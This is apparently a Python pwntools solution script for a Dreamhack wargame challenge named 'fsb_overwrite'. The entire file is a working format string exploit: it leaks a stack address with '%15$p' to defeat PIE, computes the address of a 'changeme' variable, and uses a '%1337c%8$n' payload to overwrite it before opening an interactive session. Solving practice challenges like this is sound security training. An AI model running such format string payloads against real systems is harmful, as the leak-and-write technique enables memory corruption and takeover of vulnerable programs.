# Name: Format String Bug.py

from pwn import *

HOST = 'host3.dreamhack.games'
PORT = 9737
p = remote(HOST,PORT)
elf = ELF('./fsb_overwrite')

# Get address of changeme
p.send(b'%15$p')
leaked = int(p.recvline()[:-1], base=16)
code_base = leaked - 0x1293
changeme = code_base + elf.sym['changeme']

# Write 1337 to changeme
fstring = b'%1337c%8$n'.ljust(16)
fstring += p64(changeme)
p.sendline(fstring)

p.interactive()